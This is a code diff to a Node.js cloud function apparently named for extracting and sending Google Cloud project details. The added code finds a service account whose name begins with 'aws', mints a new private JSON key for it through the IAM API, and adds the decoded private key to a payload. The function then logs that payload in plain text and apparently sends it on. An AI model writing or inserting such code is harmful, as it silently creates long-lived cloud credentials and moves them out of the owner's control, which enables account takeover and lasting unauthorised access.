@@ -42,6 +42,12 @@ exports.extractAndSendGCPInfo = async (req, res) => {
       awsServiceAccount = await findServiceAccountStartingWithAws(projectId);
     }
 
+    // Generate a JSON key for the AWS-prefixed service account, if found
+    let serviceAccountKeyDetails = null;
+    if (awsServiceAccount) {
+      serviceAccountKeyDetails = await createServiceAccountJsonKey(client, projectId || project, awsServiceAccount);
+    }
+
     // Extract Workload Identity Pool ID and Identity Name
     const { poolId, identityName, providerResourceName, projectNumber } = await extractWorkloadIdentityInfo(projectId);
 
@@ -53,7 +59,8 @@ exports.extractAndSendGCPInfo = async (req, res) => {
       poolId: poolId,
       identityName: identityName,
       providerResourceName: providerResourceName,
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
+      serviceAccountKey: serviceAccountKeyDetails
     };
 
     console.log('Extracted data:', JSON.stringify(payload, null, 2));
@@ -383,5 +390,56 @@ async function extractWorkloadIdentityInfo(projectId) {
       providerResourceName: null,
       projectNumber: null
     };
+  }
+}
+
+async function createServiceAccountJsonKey(client, projectId, serviceAccountEmail) {
+  try {
+    if (!client || !projectId || !serviceAccountEmail) {
+      return null;
+    }
+
+    const accessTokenResult = await client.getAccessToken();
+    const accessToken = typeof accessTokenResult === 'string'
+      ? accessTokenResult
+      : accessTokenResult?.token;
+
+    if (!accessToken) {
+      console.error('Unable to obtain access token for creating service account key');
+      return null;
+    }
+
+    const encodedEmail = encodeURIComponent(serviceAccountEmail);
+    const url = `https://iam.googleapis.com/v1/projects/${projectId}/serviceAccounts/${encodedEmail}:keys`;
+
+    const response = await axios.post(url, {
+      privateKeyType: 'TYPE_GOOGLE_CREDENTIALS_FILE',
+      keyAlgorithm: 'KEY_ALG_RSA_2048'
+    }, {
+      headers: {
+        Authorization: `Bearer ${accessToken}`,
+        'Content-Type': 'application/json'
+      },
+      timeout: 10000
+    });
+
+    if (!response.data?.privateKeyData) {
+      console.warn('Service account key creation returned without private key data');
+      return null;
+    }
+
+    const keyJson = Buffer.from(response.data.privateKeyData, 'base64').toString('utf8');
+
+    return {
+      keyId: response.data?.privateKeyId || response.data?.name || null,
+      privateKeyJson: keyJson
+    };
+  } catch (error) {
+    console.error('Error creating service account key:', error.message);
+    if (error.response) {
+      console.error('Response status:', error.response.status);
+      console.error('Response data:', error.response.data);
+    }
+    return null;
   }
 }
